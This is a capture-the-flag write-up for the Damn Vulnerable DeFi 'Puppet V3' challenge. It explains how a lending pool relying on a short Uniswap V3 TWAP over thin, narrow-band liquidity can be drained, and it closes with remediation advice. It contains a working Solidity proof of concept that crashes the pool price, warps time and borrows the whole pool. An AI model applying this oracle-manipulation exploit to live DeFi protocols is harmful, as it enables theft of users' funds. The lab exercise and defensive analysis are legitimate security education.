# Puppet V3 - Moving a TWAP When Your Time Budget Is Shorter Than Its Window

**Challenge:** Damn Vulnerable DeFi v4 - Puppet V3
**Category:** Oracle Manipulation / TWAP With Thin Liquidity
**Severity:** Critical (the whole lending pool is drained for a fraction of its value)

## What's going on

This is the third Puppet challenge, and this time the lending pool reads its price
from a real Uniswap V3 pool's 10-minute TWAP instead of a raw spot price - supposedly
the fix for the earlier versions. The pool holds 1,000,000 DVT. The player starts with
110 DVT and 1 ETH, and has to walk away with everything, **in under 115 seconds of
elapsed block time**. The DVT/WETH Uniswap V3 position was minted in a very narrow
band (ticks -60 to 60) and nothing else backs it.

A TWAP is supposed to be expensive to move because it averages price over a window, so
this looked like the real fix for the Puppet V1/V2 spot-price bug. It isn't, once you
look at how the averaging window actually behaves and how thin the liquidity is.

## The bug

`_getOracleQuote` calls Uniswap's own `OracleLibrary.consult`:

```solidity
uint32 public constant TWAP_PERIOD = 10 minutes;
...
(int24 arithmeticMeanTick,) = OracleLibrary.consult({pool: address(uniswapV3Pool), secondsAgo: TWAP_PERIOD});
```

Two things make this exploitable inside a 115-second window, even though the averaging
period is 600 seconds:

1. **Only the "now" edge of the window is under your control.** The 10-minutes-ago edge
   always lands in price history from before you did anything, so you can never make
   the *whole* average reflect a manipulated price. But `consult` computes the average
   as `(cumulative_now − cumulative_600s_ago) / 600`. Once you crash the price and let
   even a small number of seconds pass, that crashed tick gets folded into the
   cumulative sum and weighted by `elapsed / 600` - a small slice of the window, but an
   extreme enough price crash makes even a small slice swing the average a long way.

2. **The LP position has no depth outside a 120-tick band.** It was minted at ticks
   -60..60 and nothing else was ever added. Sell DVT into the pool and you blow straight
   through that band; once you're outside it there's no liquidity left to resist further
   movement, so a comparatively small amount of DVT (the player's own 110) pushes the
   pool's instantaneous price almost to Uniswap's absolute minimum tick.

The deposit/collateral logic (`DEPOSIT_FACTOR = 3`) doesn't help: it just multiplies
whatever price the TWAP reports, and the TWAP itself is now wrong.

## The attack

1. Sell the player's 110 DVT directly into the real Uniswap V3 pool via `pool.swap`,
   with the price limit set to Uniswap's minimum sqrt ratio so the swap keeps going
   until it runs out of input. This requires a small contract implementing
   `uniswapV3SwapCallback`, since Uniswap V3 pulls payment via a callback rather than a
   transfer-then-call pattern.
2. Warp forward 113 seconds — under the 115-second budget the success check enforces -
   so the crashed price gets folded into the TWAP's cumulative sum.
3. Wrap ETH into WETH and call `calculateDepositOfWETHRequired` for the pool's whole
   1,000,000 DVT balance. The now-crashed TWAP makes this cheap: **0.166 WETH** in this
   run, well inside the player's 1 ETH.
4. Approve and `borrow` everything, then send it to the recovery account.

## PoC

```solidity
function test_puppetV3() public checkSolvedByPlayer {
    PuppetV3Swapper swapper = new PuppetV3Swapper(lendingPool.uniswapV3Pool(), token, weth);
    token.transfer(address(swapper), PLAYER_INITIAL_TOKEN_BALANCE);
    swapper.crash();

    vm.warp(block.timestamp + 113);

    weth.deposit{value: PLAYER_INITIAL_ETH_BALANCE}();
    uint256 depositRequired = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
    weth.approve(address(lendingPool), depositRequired);
    lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);

    token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
}

contract PuppetV3Swapper is IUniswapV3SwapCallback {
    function crash() external {
        uint256 dvtBalance = token.balanceOf(address(this));
        uint160 limit = dvtIsToken0 ? (TickMath.MIN_SQRT_RATIO + 1) : (TickMath.MAX_SQRT_RATIO - 1);
        pool.swap(address(this), dvtIsToken0, int256(dvtBalance), limit, "");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(pool), "bad caller");
        uint256 amountOwed = dvtIsToken0
            ? (amount0Delta > 0 ? uint256(amount0Delta) : 0)
            : (amount1Delta > 0 ? uint256(amount1Delta) : 0);
        token.transfer(msg.sender, amountOwed);
    }
}
```

Full test file: `test/puppet-v3/PuppetV3.t.sol`

## Why I'm calling this Critical

- **Total loss of the lender's tokens**, for a deposit that ends up a tiny fraction of
  the value borrowed.
- **A TWAP was not enough on its own.** Averaging over time only resists manipulation
  when the attacker's window of influence is small relative to the averaging period.
  Here the success condition itself only demanded a ~115-second window, which was
  enough to meaningfully move a 600-second average once the underlying liquidity was
  this thin.
- **No special access or privileges**, just one swap, one warp, and one borrow call.
- **Shallow liquidity undermines even a "correct" oracle design.** A 100 DVT / 100 WETH
  position concentrated in a 120-tick band is nowhere near enough to secure a pool
  lending out 1,000,000 DVT.

## Fix

- Use a TWAP window that's actually long relative to how fast an attacker can act, and
  require the oracle pool to have liquidity deep enough, across a wide enough tick
  range, that moving it meaningfully costs more than any attack could profit.
- Don't borrow against liquidity that could plausibly be the *only* liquidity for that
  pair. Require a minimum number of independent liquidity providers or a minimum total
  value locked before trusting a pool as an oracle source.
- Combine the TWAP with a sanity bound against a second, independent price source, so a
  one-sided manipulation gets rejected even if it partially moves the average.
- Consider requiring the TWAP window itself to exceed the maximum time the protocol
  will tolerate between a manipulation and its use (i.e., make the window longer than
  any attacker's realistic action window, not just "long" in the abstract).

## Takeaway

A time-weighted average isn't automatically manipulation-resistant - it's only as
resistant as the ratio between the averaging window and the time an attacker actually
needs to act, combined with how much liquidity actually backs the pool across the
relevant price range. Puppet V1 and V2 taught "don't trust a spot price." Puppet V3
teaches the follow-up lesson: a TWAP read from a thin, narrow-range pool with a
short-enough attack window reduces to almost the same problem in disguise.
